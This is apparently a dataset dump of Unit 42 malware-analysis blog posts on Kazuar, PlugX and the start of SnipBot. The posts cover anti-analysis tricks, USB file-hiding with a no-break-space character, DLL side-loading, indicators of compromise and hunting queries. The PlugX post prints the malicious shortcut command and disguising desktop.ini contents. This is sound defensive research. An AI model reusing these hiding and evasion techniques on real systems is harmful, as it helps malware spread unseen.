remote requests shown in Table 3.\n| Remote Request | Kazuar’s Response | Description | | PING | PONG | Return a message with the current instance process information | | TASK | RESULT | Start a received task and return a result | | LOGS | ERROR | Retrieve error logs | Table 3.\nKazuar requests and responses using named pipes.\nAnti-Analysis Checks Kazuar uses multiple anti-analysis techniques based on a series of elaborate checks, to ensure it is not being analyzed.\nThe authors programmed Kazuar to either continue if the coast is clear, or to remain idle and cease all C2 communication if it is being debugged or analyzed.\nWe can group these checks into three main categories: honeypot, analysis tools and sandbox.\nAnti-Dumping Because Kazuar is not designed to run as a standalone process but rather lives injected within another process, dumping its code is possible from memory of the injected process.\nTo prevent that from happening, Kazuar uses a powerful feature of .NET, which is the System.\nReflection Namespace.\nThis gives Kazuar the ability to gather real-time metadata about its assembly, methods and more.\nKazuar checks if it has set the antidump_methods setting to true, then overrides the pointers to its custom methods, while ignoring generic .NET methods, essentially wiping them from memory (as Kazuar’s logged message states).\nThis ultimately prevents researchers from dumping an intact version of the malware.\nHoneypot Check One of the first things Kazuar specifically searches for is the existence of Kaspersky honeypot artifacts on the machine.\nIt uses a hard-coded list of specific process names and filenames to do this.\nIf Kazuar finds more than five of these files or processes, it will log that it found a Kaspersky honeypot.\nFigure 18 shows these filenames.\nAnalysis Tools Check Kazuar has a list of hard-coded names of different popular analysis tools such as the following: - Process Monitor - X32dbg - DnSpy - Wireshark It goes over the list of running processes, and if one of these tools is running, Kazuar will log that it found analysis tools (see Appendix).\nSandbox Check Kazuar has a list of hard-coded known sandbox libraries.\nIt checks for the presence of certain DLLs that belong to different sandbox services.\nIf the malware finds these files, it determines that it is being executed in a lab (see Appendix).\nEvent Log Monitor Kazuar collects and parses events from the Windows event logs.\nFigure 19 shows Kazuar specifically looking for events from the following antivirus/security vendors: - Kaspersky Endpoint Security - Symantec Endpoint Protection Client - Microsoft Windows Defender - Doctor Web Same as with checking for Kaspersky’s honeypot, a plausible explanation would be that these security products are popular with their victims.\nStrengthening Kazuar’s Connection to Pensive Ursa As mentioned above, when composing its initial HTTP POST request to its C2, Kazuar uses the machines GUID or a hard-coded GUID 169739e7-2112-9514-6a61-d300c0fef02d as a cookie, which is then type casted to string and Base64 encoded.\nSearching the latter value in its string format (169739e7211295146a61d300c0fef02d) yields a report [PDF] by the Swiss CERT, which analyzes an attack carried out by Pensive Ursa against RUAG.\nRUAG Holding is a Swiss company from the aerospace and defense sector.\nIn addition, Kazuar’s tasks and results architecture, including the hybrid AES + RSA encryption scheme and other clear similarities in functionality, are the very image of Carbon’s modus operandi.\nIt is mentioned both in the Swiss’s CERT report and another report by ESET.\nCarbon is another second stage backdoor that was attributed multiple times to Pensive Ursa, whose code was a fork of Snake, as mentioned by CISA.\nThese findings, along with the reports by multiple CERTs, further support the previous Unit 42 assumptions proposing that Kazuar might be Carbon’s successor.\nMost importantly, these findings strengthen the attribution of Kazuar to Pensive Ursa.\nConclusion We examined the newest Kazuar malware variant that we detected in the wild.\nNotable features include the following: - Robust code and string obfuscation techniques - A multithreaded model for enhanced performance - A range of encryption schemes implemented to safeguard Kazuar’s code from analysis and to conceal its data whether in memory, during transmission or on disk All the aforementioned features are designed to provide the Kazuar backdoor a high level of stealth.\nOther noteworthy characteristics of this malware are: - Its anti-analysis functionalities - Extensive system profiling capabilities - The specific targeting of cloud applications This version of Kazuar also supports an array of over 40 distinct commands, half of which were previously undocumented.\nWe encourage security practitioners and defenders to study this report and use the information provided to enhance current detection, prevention and hunting practices to overall strengthen their security posture.\nCortex XDR Detection and Prevention Figure 20 shows Cortex XDR detected and prevented the execution of Kazuar.\nAs detailed in the technical analysis section, by default Kazuar injects its code into explorer.exe.\nWhen configured to operate on detect mode, Cortex XDR detects the malicious activity originating from the injected explorer.exe, as depicted in Figure 20 below.\nExecution of native code by Kazuar for process injection and WMI execution triggered several alerts, as well as other suspicious and uncharacteristic activity carried out by explorer.exe.\nWe detailed the alerts, including the alert shown in Figure 20, in Figure 21 below.\nIn addition, Figure 22 documents and details the directory and files that the malware created to store its configuration and logs.\nFinally, Figure 23 shows that when in prevent mode, Cortex XDR prevents the Kazuar malware executable and triggers the alert pop-up accordingly.\nProtections and Mitigations The Cortex XDR platform detects and prevents the execution flow described in the screenshots included in the previous section.\nIn addition to the classic detection, the unique SmartScore engine translates security investigation methods and their associated data into a ML-driven hybrid risk scoring system.\nFigure 24 shows that the Kazuar variant and its related incident detailed in this blog scored 97 out of 100 by SmartScore.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this group.\nCortex XDR and XSIAM detect user and credential-based threats by analyzing user activity from multiple data sources including the following: - Endpoints - Network firewalls - Active Directory - Identity and access management solutions - Cloud workloads Cortex XDR and XSIAM build behavioral profiles of user activity over time with machine learning.\nBy comparing new activity to past activity, peer activity and the expected behavior of the entity, Cortex XDR and XSIAM detect anomalous activity indicative of credential-based attacks.\nIt also offers the following protections related to the attacks discussed in this post: - Prevents the execution of known malicious malware and also prevents the execution of unknown malware using Behavioral Threat Protection and machine learning based on the Local Analysis module - Protects against credential gathering tools and techniques using the new Credential Gathering Protection available from Cortex XDR 3.4 - Protects against exploitation of different vulnerabilities including ProxyShell and ProxyLogon using the Anti-Exploitation modules as well as Behavioral Threat Protection - Cortex XDR Pro and XSIAM detect postexploit activity, including credential-based attacks, with behavioral analytics - Next-Generation Firewall with the Advanced Threat Prevention security subscription can help block the malware C2 traffic via the following Threat Prevention signature: 86805. -\nThe Advanced WildFire machine-learning models and analysis techniques have been reviewed and updated in light of this new Kazuar variant.\nMultiple products in the Palo Alto Networks portfolio leverage Advanced WildFire to provide coverage against Kazuar variants and other threats.\nIf you think you might have been impacted or have an urgent matter, get in touch with the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nIndicators of Compromise Kazuar SHA256 - 91dc8593ee573f3a07e9356e65e06aed58d8e74258313e3414a7de278b3b5233 Command and Control Servers - hxxps://www.pierreagencement[.]fr/wp-content/languages/index.php - hxxps://sansaispa[.]com/wp-includes/images/gallery/ - hxxps://octoberoctopus.co[.]za/wp-includes/sitemaps/web/ RSA Keys 7ondEZo8ZjYh+FP4h3PgJBU/yTlO+g8ZbCF0wx8eocnqxLS4YWI9hG3SI2hlEBz6J4vvxPCrs/jazekolaZLQnbyOCyH53I+We+x32d2lUlXrtZA/0oJa39tW2t2NsUG/xPqsY3rBCuhi28hl30XH8Arn2/u9Jxl1G9dNxFDdVxk9ePjlHecdAtWCa9vmC4HY0Wlqyhd0+hJfvKCoKLsHuCyl4b/c343VVVTFubYNSFJMQnpIKsYQDRKtRszQuS1Ls+obyOr+0cbAmnKb8twTsq862pA6MzxRr16/4/1nyrNKuDS+OvPfv3tgvssybtGwN8D8Qac7O1FM722Nft16iis9WaoFuXCwP/LCkaetQMjEKN07H6ESHMnUc+JDvINIspAAKK8fRwtTcWKrG2bh/Dwtneq/9L1Pv2cKtpQAUlxVfQX5I/mtATEHIMcPOvNWRUqmSssDHEJiZDFKS45SjoG4qXs536xwbZ4k6lmHUUOVzkmCc71HooxRdSYx1M7Vqvou1Mi39O6vJouL2aTO6ymbGdnerKavDsgBSa2HKRbP2Nym6Ud4WAhiaqnPCWGnJz7l+4Hs++OcG2p+Ct1oXRecLK6Zy/n9moTZeijLdqJwUh90Bht8V8STz/vNtrhz++Do6DsDssENkOHXeUeRCqCmDdS3sqkxQnGAG3tGvc= AQAB pyR0/srVS0gOZbNdK3iK+GvekQVkBq8brOVCuN/XcCz4WLJod9GhivDYrDtMXF6ZMGHKa2zAcQ+v2vltYW3X2BYCZ1sblEznfIk+oHs+lesblfHVyPPXDcTLLf5IUuGE/dzeSpLhlWiFT/4MyeMLzU8QexpRkBn0qJkk5xWU0D09DN0SaNzA8E4grU61aaul5iNRYMO+qLXmtIJhrjUrnHNu7ZnZ+AQtc19Dhne1hciH4aj00HRLXsofWGWsELEhZv92cnQ0Rf9n00EGB591zDR8gAt3T5sSTQvjMGWOBHusfGV4ytmchmQWZ8QY7Fp4EPgn8vM48OR2z13qo4YSediAt9Af+YKGoPu2PU3szx08UwBZRz4cyYZB3zcFB8NxCx7Gki2rS5bYx1Z1cG/kU+Ri2gXYoCHgOz8umr+PDB+21V1pnmStxzWAdR7mK0e663LMxxAcZWjEArbt/BcIiZAkFsyoq+NJbuKTR2RYAW+4DXbxFQeGKnFBgle3u9ktcYXWqgJ8/rvs920rGf9k3br3I+2MtzrWglhRi/WkAmTrEIL4i1id0M0askl0YBHlzU9+Bgv2y/VsLH2UKQlp+owxGm1jequxwGpZfwxmWAMATe8L2qctVdXEOfT7Ue67AsVjkP/VmhbhGDO8zt38trylUhWnpUeYdkigg9Nxs1k= AQAB Additional References - Targeted Turla attacks (UAC-0024, UAC-0003) using CAPIBAR and KAZUAR malware [English version] – CERT-UA (Ukraine) - Kazuar: Multiplatform Espionage Backdoor with API Access – Unit 42, Palo Alto Networks - Researchers Find Links Between Sunburst and Russian Kazuar Malware – The Hacker News - Nation-state Turla resurfaces with a Sophisticated RAT – Cyberint (PDF) - Guid Struct (System) – Microsoft Learn - Technical Report about the Malware used in the Cyberespionage against RUAG – Swiss GovCERT - Turla renews its arsenal with Topinambour – Securelist, Kaspersky - Hunting Russian Intelligence “Snake” Malware – Cybersecurity Advisory, CISA - Indicator Removal: Timestomp, Sub-technique T1070.006 - Enterprise – MITRE ATT&CK - Swallowing the Snake’s Tail: Tracking Turla Infrastructure – Recorded Future - Carbon Paper: Peering into Turla’s second stage backdoor – WeLiveSecurity, ESET - Carbon, Software S0335 – MITRE ATT&CK - Threat Group Assessment: Turla (aka Pensive Ursa) – Unit 42, Palo Alto Networks","num_sentences":198,"metadata":{"source":"blog","platform":"Unit42","filename":"Pensive-Ursa"}}
{"id":85,"title":"Chinese PlugX Malware Hidden in Your USB Devices?","publish_date":"2020-11-28","link":"https://unit42.paloaltonetworks.com/plugx-variants-in-usbs/","clean_text":"Executive Summary Recently, our Unit 42 incident response team was engaged in a Black Basta breach response that uncovered several tools and malware samples on the victim's machines, including GootLoader malware, Brute Ratel C4 red-teaming tool and an older PlugX malware sample.\nThe PlugX malware stood out to us as this variant infects any attached removable USB media devices such as floppy, thumb or flash drives and any additional systems the USB is later plugged into.\nThis PlugX malware also hides actor files in a USB device using a novel technique that works even on the most recent Windows operating systems (OS) at the time of writing this post.\nThis means the malicious files can only be viewed on a Unix-like (*nix) OS or by mounting the USB device in a forensic tool.\nWe also discovered a similar variant of PlugX in VirusTotal that infects USB devices and copies all Adobe PDF and Microsoft Word files from the host.\nIt places these copies in a hidden folder on the USB device that is created by the malware.\nPlugX is a second-stage implant used not only by multiple groups with a Chinese nexus but also by several cybercrime groups.\nIt has been around for over a decade and has been observed in some high-profile cyberattacks, including the U.S. Government Office of Personnel Management (OPM) breach in 2015.\nIt is a modular malware framework, supporting an evolving set of capabilities throughout the years.\nPalo Alto Networks customers receive protections against the types of threats discussed in this blog by products including Cortex XDR and WildFire.\n| Related Unit 42 Topics | PlugX, Brute Ratel C4 | Introduction It's not uncommon for multiple malware samples to be discovered during an investigation, as occurred in this situation with GootLoader, Brute Ratel C4 and PlugX. Numerous threat actors compromise targets and can coexist simultaneously on the affected machine.\nBecause we can’t conclusively say whether these malware samples were left by one group or several, we can't attribute these tools to the Black Basta ransomware group.\nHowever, the version of Brute Ratel C4 used in this case is the same one reported by Trend Micro, which also involved the Black Basta ransomware group.\nPlugX Malware Infection Historically, a PlugX infection begins by hijacking a known and trusted, digitally signed software application to load an actor-created encrypted payload.\nThis technique has been used since 2010 and is listed in the MITRE ATT&CK techniques as Hijack execution flow DLL-Side loading ID: T1574.002 Sub-technique T1574.\nIn this case, the threat actors decided to hijack a popular and free open source debugging tool for Windows called x64dbg, which is used by the malware analysis/reverse engineering community.\nX64dbg applications are digitally signed by \"Open Source Developer Duncan Ogilvie.\"\nThe developers of this tool offer two types of debugger applications: x64 for 64-bit applications and x32 for 32-bit applications.\nIn this case, the actors used x32dbg.exe, which is the 32-bit debugger of x64dbg.\nUpon execution of x32dbg.exe, Microsoft Windows will attempt to resolve any dependency files necessary to run the application.\nThat search starts locally (i.e., in the current working directory).\nIf found, the necessary files are loaded and executed.\nX32bridge.dll is a Windows Dynamic Link Library (DLL) dependency file of x32dbg.exe.\nA legitimate x32bridge.dll also carries the same digital signature.\nIn this case, the file is not signed.\nOnce loaded, the malware searches locally for an actor-created encrypted payload file: x32bridge.dat (SHA256: e72e49dc1d95efabc2c12c46df373173f2e20dab715caf58b1be9ca41ec0e172).\nX32bridge.dat was first submitted to VirusTotal on Jan. 22, 2021.\nAs of Dec. 15, 2022, it has a detection score of eight out of 61 engines.\nNone of the engines identify the file as PlugX malware.\nOnce loaded and decrypted in memory, the malware infects the host and any removable USB devices attached with the PlugX malware.\nFigure 1 below illustrates PlugX DLL side loading using x64dbg DLL hijacking.\nBoth the hijacking of x64dbg and the association of this behavior with the PlugX malware were reported by Sophos back in November 2020.\nTheir blog refers to this malware as KilllSomeOne, based on a Program Database (PDB) string found in one of the binaries.\nSophos performed an excellent analysis of the samples and touched on the USB infection.\nWe confirmed that our sample matched the behaviors described in their report.\nFrom there, we wanted to expand our research by focusing on the USB infection, other USB variants in the wild and links to the PlugX malware.\nPlugX Malware USB Overview The technique used by the PlugX malware to hide files in a USB device involves using a certain Unicode character.\nThis hinders Windows Explorer and the command shell (cmd.exe) from displaying the USB directory structure and any files, concealing them from the victim.\nThe Unicode character used by this PlugX malware for the directories is 00A0 (a whitespace character called a no-break space).\nThe whitespace character prevents the Windows Operating System from rendering the directory name, concealing it rather than leaving a nameless folder in Explorer.\nTo achieve code execution of the malware from the hidden directory, a Windows shortcut (.lnk) file is created on the root folder of the USB device.\nThe shortcut path to the malware contains the Unicode whitespace character, which is a space that does not cause a line break, but this is not visible when viewed via Windows Explorer, as shown below in Figure 2.\nWhen the shortcut file is viewed in a hex editor, the hex representation of these characters is shown as highlighted below in Figure 3.\nThe PlugX malware uses the Component Object Model (COM) interface to create the .lnk files and includes the Unicode character 00A0.\nIt does this by creating an instance of a shell desktop to create the associated Windows shortcut files.\nThe ShellLink SetArguments method is used to set the command line arguments, which include the white space no break Unicode character, as shown in Figure 4 below.\nFinally, the ShellLink::Save method saves the shortcut file with all the changes.\nPlugX Malware USB Infection The PlugX malware x32bridge.dll loads x32bridge.dat, which is responsible for implanting the host with malware and infecting any attached removable media USB devices such as floppy, thumb or flash drives.\nIf a removable media device is found, the following steps are performed: - It creates the following directory structure: :\\u00A0\\u00A0\\RECYCLER.BIN\\files.\nExample: F:\\ \\ \\RECYCLER.BIN\\files. -\nIt creates a hidden file named desktop.ini in each folder, which specifies the icon for the folder.\nThis file contains the following data: [.ShellClassInfo] IconResource=%systemroot%\\system32\\SHELL32.dll,7 The Windows OS uses a single file to retrieve icon images that are displayed on the desktop as shortcuts or from Windows Explorer files and folders.\nThe Shell32.dll file contains a list of icons and a unique number.\nIn this case, the drive icon and the number 7 are used, as shown below in Figure 5.\nThe use of this drive icon makes the directories appear as drives within Windows Explorer when viewed with hidden files enabled.\nIf deleted, the directories appear as folders. -\nIn the second directory, it creates a subfolder named RECYLER.BIN.\nThis directory acts as a recycle bin.\nIn that directory is a subdirectory named files and a hidden desktop.ini file.\nThis desktop.ini file contains the following data: [.ShellClassInfo] CLSID = {645FF040-5081-101B-9F08-00AA002F954E} This CLSID instructs Windows Explorer to display the created RECYCLER.BIN folder as a recycle bin directory by giving it the recycle bin icon.\nThis is shown in Figure 11 as an example. -\nThe files subfolder contains copies of the PlugX malware x32dbg.exe, any encrypted actor .dat files and the actor’s malicious DLL.\nAn example of this is shown in Figure 6 below.\nIt should be noted that pre-infection of the USB device, existing files or directories on the root of the removable device are moved to the second hidden folder on the USB device, as shown below in Figure 7. -\nWhenever the shortcut file from the infected USB device is clicked, the PlugX malware launches Windows Explorer and passes the directory path as a parameter.\nThis then displays the files on the USB device from within the hidden directories and also infects the host with the PlugX malware.\nThe victim sees their files and assumes all is working as expected.\nFigure 8 below illustrates how an infected USB thumb drive would appear to a victim in Windows Explorer using default settings (i.e., not displaying hidden files).\nAn infected PlugX USB device has no files or directories in the root folder and contains only a .lnk file.\nFigure 9 shows that the shortcut file is TESTDRIVE, which matches the USB device name.\nThe shortcut file is responsible for infecting the host and navigating to the hidden directory on the USB device each time it is clicked.\nFor example, the shortcut file referenced in Figure 9 contains the following data: %comspec% /q /c \" \\ \\RECYCLER.BIN\\files\\x32dbg.exe\" Once the target clicks the shortcut, x32dbg.exe is launched via cmd.exe from the hidden files directory on the USB device.\nThe host the USB is attached to is now infected with the PlugX malware.\nWhen viewing the contents of the infected USB device with Windows Explorer and hidden items enabled, a victim would see the following images: They would then see the following, as shown in Figure 10, within the first hidden directory: As shown in Figure 11, Windows Explorer displays another hidden directory along with a shortcut file.\nThe shortcut file has the same properties to launch x32dbg.exe and will infect the host with the USB device attached.\nWhen viewing the contents of the next hidden folder, Windows Explorer shows the following directory structure: This directory contains a RECYLER.BIN folder that masquerades as a Windows recycle bin, along with any files or directories that existed in the root folder of the USB device at the time of infection.\nWhen viewing the contents of the RECYLER.BIN with Windows Explorer, a victim will see what’s shown in Figure 12: Since the default setting for Windows Explorer is not to show hidden items, the only item visible to the victim is the shortcut file, as shown in Figure 8.\nEven with hidden files enabled, Windows Explorer or cmd.exe cannot show the malware files that reside in the files subdirectory.\nThe malware files can only be viewed on a *nix OS or by mounting the USB device in a forensic tool.\nFigure 13 shows how the USB device looks once it’s mounted in Ubuntu, browsing to it via File Explorer.\nPlugX Malware Post USB Infection When a host is infected with this variant of the PlugX malware, the malware continuously monitors for USB removable devices.\nOnce a USB device is discovered and infected, any new files written to the USB device root folder post-infection are moved to the hidden folder within the USB device.\nSince the Windows shortcut file resembles that of a USB device and the malware displays the victim's files, they unwittingly continue to spread the PlugX malware.\nPlugX Malware USB Variant Two Armed with this knowledge, we wondered if other similar PlugX USB infection malware existed in the wild.\nFile SHA256: 5b496972a86cea66aeecaac6e3f67a92e22f35cd5d2a98d54a2f1218fcd5dfc5 in VirusTotal matches the behaviors of x32bridge.dat, specifically the creation of the Windows Scheduled Task and PDB string referenced in the Sophos blog.\nThis file is a Windows x86 PE file (DLL), the in-memory equivalent of x32bridge.dat.\nOur analysis shows the runtime behavior is identical to the x32bridge.dat USB infection detailed earlier, but it has an added capability.\nIt copies documents from the host machine to a new hidden USB subfolder named da520e5.\nThe malware specifically copies all Adobe PDF and Microsoft Word documents from the host to this directory.\nFigure 14 below shows an example of the directory and files copied from our host.\nThis PlugX USB malware variant was designed to exfiltrate specific files from its target that could be retrieved later, as this directory and files are not used by the malware or displayed to the victim.\nAssociation With PlugX Malware In addition to USB infection, both x32bridge.dat and the second PlugX malware variant discovered in VirusTotal check the target for specific running processes.\nIf found, it terminates them and deletes the directories from which they were executed.\nX32bridge.dat seeks out process names starting with AAM and, if found, terminates the process and deletes specific directories associated with the process.\nThe Sophos blog speculated that this behavior likely removed older PlugX malware variants.\nPrevious variants attributed to PlugX started with AAM file names (i.e., AAM Updates.exe).\nThe second variant we discovered in VirusTotal also performs this check, including one for the specific process file name AAM Updates.exe.\nAdditionally, if AAM Updates.exe is found, it deletes the directory AAM UpdatesikB, which is a folder that has also been associated with the PlugX malware family.\nSince both x32bridge.dat and the second PlugX malware variant discovered in VirusTotal share the same USB infection method along with other runtime behaviors, we can conclusively state that it is indeed associated with PlugX. Conclusion PlugX malware has been used for over a decade and was historically extensively associated with Chinese nation-state APT groups.\nOver the years, it has been adopted and used by other threat groups, from nation-states to ransomware actors.\nThe typical tradecraft of PlugX uses benign files to achieve code execution, also known as DLL side loading, that many security vendors now detect and prevent.\nThis might be part of why the actors added the capability to infect any attached removable media USB devices such as floppy, thumb or flash drives as well as any additional systems the USB is later plugged into.\nAny host infected with this variant of the PlugX malware will continuously monitor for new USB removable devices to infect.\nThis PlugX malware also hides attacker files in a USB device with a novel technique, which makes the malicious files only viewable on a *nix OS or by mounting the USB device in a forensic tool.\nBecause of this ability to evade detection, the PlugX malware can continue to spread and potentially jump to air-gapped networks.\nAdditionally, we discovered a similar variant of PlugX in VirusTotal with the added capability of copying all Adobe PDF and Microsoft Word documents from the infected host to the USB device's hidden folder created by the PlugX malware.\nThe discovery of these samples indicates PlugX development is still alive and well among at least some technically skilled attackers, and it remains an active threat.\nFor Palo Alto Networks customers, our products and services provide the following coverage associated with this campaign: - Cortex XDR customers receive protection at the endpoints from the malware techniques described in this blog. -\nWildFire cloud-based threat analysis service accurately identifies the malware described in this blog as malicious.\nIf you think you may have been compromised or have an urgent matter, contact the Unit 42 Incident Response team or call: - North America Toll-Free: 866.486.4842 (866.4.UNIT42) - EMEA: +31.20.299.3130 - APAC: +65.6983.8730 - Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors.\nLearn more about the Cyber Threat Alliance.\nUnit 42 Managed Threat Hunting Queries | 1 2 3 4 5 6 | // Detecting potential DLL side loading config case_sensitive = false timeframe = 30d | dataset = xdr_data | filter event_type = ENUM.LOAD_IMAGE and action_module_signature_status = 3 and ((action_module_path contains \"mpsvc.dll\" and actor_process_image_name = \"aug.exe\") or (action_module_path contains \"dismcore.dll\" and actor_process_image_name = \"aug.exe\" ) or (action_module_path contains \"\\hex.dll\" and actor_process_image_name = \"SafeGuard.exe\") or (action_module_path contains \"x32bridge.dll\" and actor_process_image_name = \"x32dbg.exe\") or (action_module_path contains \"x32bridge.dll\" and actor_process_image_name = \"Mediae.exe\")) | comp count() as counter by actor_process_image_path , action_module_path , action_module_sha256 | | 1 2 3 4 5 6 | // Adding registry persistence config case_sensitive = false timeframe = 30d | dataset = xdr_data | filter event_type = ENUM.REGISTRY and event_sub_type = ENUM.REGISTRY_SET_VALUE and action_registry_key_name contains \"Microsoft\\Windows\\CurrentVersion\\Run\" and (action_registry_data contains \"x32dbg.exe\" or action_registry_data contains \"aug.exe\" or action_registry_data contains \"SafeGuard.exe\") | fields action_registry_data , action_registry_file_path , action_registry_key_name , actor_process_command_line , agent_hostname | | 1 2 3 4 5 6 | // Payload execution with rundll32.exe config case_sensitive = false timeframe = 30d | dataset = xdr_data | filter event_type = ENUM.PROCESS and action_process_image_path contains \"rundll32\" and (action_process_image_command_line contains \"\\akm.dat\" or action_process_image_command_line contains \"\\precious.dat\") | fields action_process_image_command_line , actor_process_image_command_line , agent_hostname | Indicators of Compromise Known PlugX Samples: 8ec37dac2beaa494dcefec62f0bf4ae30a6ce44b27a588169d8f0476bbc94115 e72e49dc1d95efabc2c12c46df373173f2e20dab715caf58b1be9ca41ec0e172 0e9071714a4af0be1f96cffc3b0e58520b827d9e58297cb0e02d97551eca3799 39280139735145ba6f0918b684ab664a3de7f93b1e3ebcdd071a5300486b8d20 41a0407371124bcad7cab56227078ccd635ba6e6b4374b973754af96b7f58119 02aa5b52137410de7cc26747f26e07b65c936d019ee2e1afae268a00e78a1f7f 2a07877cb53404888e1b6f81bb07a35bc804daa1439317bccde9c498a521644c 5d98d1193fcbb2479668a24697023829fc9dc1f7d31833c3c42b8380ef859ff1 Known File Directories C:\\ProgramData\\UsersDate\\Windows_NT\\Windows\\user\\Desktop\\ C:\\Users\\Public\\Public Mediae\\ Known Windows Mutex Names LKU_Test_0.1 LKU_Test_0.2 TCP_0.1 Known PlugX Encrypted Payload File Names akm.dat precious.dat x32bridge.dat Groza_1.dat Known Windows Scheduled Task Names LKUFORYOU_1 PRECIOUS_0.1 Known Windows Process Names (Observed Abused Benign Files) x32dbg.exe x32dbge.exe Mediae.exe Aug.exe Precious.exe SafeGuard.exe Dism.exe MITRE ATT&CK Techniques Additional Resources - THOR: Previously Unseen PlugX Variant Deployed During Microsoft Exchange Server Attacks by PKPLUG Group - Brute Ratel C4 Red Teaming Tool Being Abused by Malicious Actors - NJCCIC Alert Gootloader Malware Platform Uses Sophisticated Techniques to Deliver Malware - A new APT uses DLL side-loads to “KilllSomeOne” – Sophos News - Black Basta Ransomware Gang Infiltrates Networks via QAKBOT, Brute Ratel, and Cobalt Strike (trendmicro.com) - Inside the OPM Hack, The Cyberattack that Shocked the US Government | WIRED - ASCII Codes - ASCII Table","num_sentences":113,"metadata":{"source":"blog","platform":"Unit42","filename":"PlugX"}}
{"id":86,"title":"Inside SnipBot: The Latest RomCom Malware Variant","publish_date":"2023-12-28","link":"https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/","clean_text":"Executive Summary We recently discovered a novel version of the RomCom malware family called SnipBot and, for the first time, show post-infection activity from the attacker on a victim system.\nThis new strain makes use of new tricks and unique code obfuscation methods in addition to those seen in previous versions of RomCom 3.0 and PEAPOD (RomCom 4.0).\nIn early April, our sandbox Advanced WildFire discovered an unusual DLL module that turned out to be part of a broader tool set called SnipBot.\nBy examining the malware sample and using Cortex XDR telemetry data, we were able to reconstruct the infection chain and the attacker's subsequent actions.\nWe also discovered more related malware strains dating back to December 2023.\nAlthough the aim of the attacker is unknown, the behavior we observed indicates an attempt to pivot through the victim's network and exfiltrate certain files.\nSnipBot gives the attacker the ability to execute commands and download additional modules onto a victim's system.\nIt is a new version of the RomCom malware that is mainly based on RomCom 3.0.\nHowever, it also contains techniques seen in its offshoot PEAPOD called RomCom 4.0 by Trend Micro.\nTherefore, we’ve assigned it version 5.0.\nThis threat operates in several stages, with the initial downloader always being an executable, followed by further EXEs or DLLs.\nThe downloader we observed was consistently signed with a valid code signing certificate that the threat actor likely obtained either through certificate theft or fraud to purchase a new certificate, while subsequent modules were unsigned.\nIn collaboration with Sophos, which initially found this new RomCom version in February during an incident, we investigated the malware's capabilities and gathered some knowledge about the attackers' activity on a victim’s system.\nPalo Alto Networks customers are better protected from the SnipBot malware through products like Cortex and Advanced WildFire, with its different memory analysis features.\nAdvanced WildFire classifies the SnipBot malware samples in this article as malicious.\nAdvanced URL Filtering and Advanced DNS Security classify known URLs and domains associated with this activity as malicious.\nIf you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team.\n| Related Unit 42 Topics | Backdoors, RomCom | Malware Background RomCom RAT is a malware family that has evolved over the years to include different features and attack methods.\nThe threat actor using RomCom has been active since at least 2022.\nThey engage in ransomware, extortion and targeted credential gathering, likely to support intelligence-gathering operations.\nRomCom has made multiple advancements, leading to its newest iteration called SnipBot, which employs new commands and evasion techniques.\nThe SnipBot variant of RomCom leverages a basic set of features that allows the attacker to run commands on a victim's system and download additional modules.\nThe initial payload is always either an executable downloader masked as a PDF file or an actual PDF file sent to the victim in an email that leads to an executable.\nThe earliest initial sample of SnipBot we found was a PDF file that shows distorted text that states a font is missing that’s needed to show it correctly.\nIf the victim clicks on the contained link that’s purported to download and install the font package, they will instead download the SnipBot downloader.\nSnipBot consists of several stages where the initial downloader is always an executable file and the remaining payloads are either EXEs or DLLs.\nThe downloader is always signed with a legitimate and valid code signing certificate.\nWe don’t know how the threat actors obtain these certificates, but it’s likely they steal them or gain them by fraud.\nSubsequent modules were not signed.\nEmail Infection Vector By reviewing Cortex XDR telemetry data and reverse engineering the initial sample, we were able to recreate the whole infection chain.\nThe initial infection vector in our case was an email that contained a link that redirects twice to the SnipBot downloader.\nFigure 1 shows the chain of URLs from the initial one contained in the email to the final SnipBot downloader file link.\nThe attacker registered the domains fastshare[.]click and docstorage[.]link.\nThe website temp[.]sh is a legitimate file sharing service with a set hosting period of three days.\nWe discovered another chain of links that was likely used by the same attacker to deliver a similar SnipBot downloader variant.\nThe distinct initial domain and the similar downloader file name imply this was part of a campaign targeting multiple victims.\nFigure 2 shows another chain of URLs used in another attack.\nThe attacker created the domain publicshare[.]link; it is not a legitimate file sharing service.\nSnipBot Malware Figure 3 shows the infection chain of the different SnipBot stages.\nThe initial downloader Attachment_Medical report.exe is a 64-bit Windows executable (SHA256: 57e59b156a3ff2a3333075baef684f49c63069d296b3b036ced9ed781fd42312) disguised as a PDF file.\nIt is signed with a presumably stolen or spoofed certificate from CC Byg og Udlejning ApS, which is a company located in Denmark.\nThis downloader uses two simple yet effective anti-sandbox tricks.\nThe first one checks for the original file name by comparing the hashed process name against a hard-coded value.\nThe second one checks whether there are at least 100 entries in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs registry key, which is usually the case on a regular user’s system but less likely to be the case in a sandbox system.\nFigure 4 shows the RecentDocs registry key of a typical Windows system with more than 100 values present.\nThe downloader is also obfuscated with a window message-based control-flow obfuscation algorithm.\nThe malware code is split up into multiple unordered blocks that are triggered by custom window messages.\nTo accomplish this, a window is created that has a callback message that contains these code blocks.\nThe window message queue is used to call each block in its original order.\nThe first message block is triggered by sending the initial message and then each block sends the next message when it’s done.\nAdditionally, each block can also send nested messages, which makes it even more challenging to follow the execution flow.\nMost of the strings, such as the command and control (C2) domain name and all the names of dynamically resolved API functions, are encrypted.\nThe threat actor likely did this to prevent easy static detection, thus making malware analysis more time-consuming.\nUpon execution, the downloader contacts the first C2 domain xeontime[.]com and tries to get a PDF file and the first payload.\nWe couldn’t recover the original downloaded first payload, but for an unknown reason, the attacker later downloaded the same payload with different configuration data and started it manually.\nWe were able to obtain this file and could continue our analysis.\nThe threat downloads the PDF to the local user’s temporary folder with a random name before opening it.\nThe first payload is a DLL file (internally named config-pdf.dll) that the threat executes in memory.\nIt has an exported function named GetStore that contains its malicious code.\nThis DLL file’s purpose is to download the next stage COM DLL named keyprov.dll from the second C2 